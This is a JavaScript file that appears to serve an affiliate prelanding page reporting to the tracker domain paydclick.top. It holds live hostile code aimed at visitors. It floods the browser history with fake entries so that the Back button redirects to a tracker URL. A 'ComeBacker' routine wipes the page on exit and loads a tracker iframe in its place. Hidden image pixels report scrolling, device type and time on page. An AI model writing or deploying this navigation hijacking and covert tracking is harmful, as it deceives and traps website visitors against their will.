const urlHrefSc = window.location.href;
const prelandSc = urlHrefSc.replace(/^\S*\.\w*\//, '').split('?')[0].replace(/\/$/, '').replace(/\//g, '_');

! function ()
{
        var t;
        try {
            window.onbeforeunload = null;
const URL = window.location.href.split(/[#]/)[0];
            for (t = 0; 10 > t; ++t) history.pushState({}, "", URL+'#')
            onpopstate = function(event){
                event.state && location.replace('https://paydclick.top/click.php?lp=1&place=backfix&event10=1'+'preland='+prelandSc);
            }
        } catch (o) { console.log( o ); }
    }();
!function(){"use strict";function t(t){var e=this;this.params={landingUrl:t.landingUrl||"",text:"",imageSrc:"",innerHtml:void 0,inited:!1,reinitable:!1},this.params.text=this.params.text.replace(/\\n/g,"\n"),""===this.params.reinitable&&(this.params.reinitable=!1),this.params.landing_complete&&(this.params.landingUrl=this.params.landing_complete),this.el=document.createElement("div"),this.el.setAttribute("style","height: 100vh"),this.el.setAttribute("id","Comebacker"),window.onbeforeunload=function(){if(e.params.reinitable||!e.params.inited)return e.unload.call(e),e.params.text},"object"==typeof window.Opera&&(!e.params.reinitable&&e.params.inited||(e.unload.call(e),prompt(e.params.text)))}t.prototype={unload:function(){this.params.inited=!0,document.body.innerHTML="";var t=document.createElement("iframe");t.src=this.params.landingUrl,t.setAttribute("style","width:100%; height: 100%; border: 0; display:block;"),this.el.appendChild(t),document.body.appendChild(this.el)}},window.ComeBacker=t}();
var params = {
    landingUrl: 'https://paydclick.top/click.php?lp=1&place=comebacker&event9=1'+'preland='+prelandSc,
}
var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
var element = document.getElementById('text');
if (!isMobile) {
    new ComeBacker(params)

    var links = document.querySelectorAll('a');
    
    for(var i = 0; i < links.length; i++){
        links[i].addEventListener('click', function() {
            window.onbeforeunload = null
        });
    }
}
var o,scroll=0;function pushToTrackerViaImage(){var e=document.createElement("img");e.src="http://paydclick.top/click.php?event8=1",e.style.display="none",document.body.appendChild(e)}function pushAfterTimeout(e){setTimeout(pushToTrackerViaImage,1e3*e)}window.onscroll=function(){1!=scroll&&(scroll=1,document.createElement("img").src="http://paydclick.top/click.php?event7=1")},void 0===window.orientation?(o=document.createElement("img")).src="http://paydclick.top/click.php?event6=0":(o=document.createElement("img")).src="http://paydclick.top/click.php?event6=1";var TIMEOUT_IN_SECONDS=30;pushAfterTimeout(TIMEOUT_IN_SECONDS);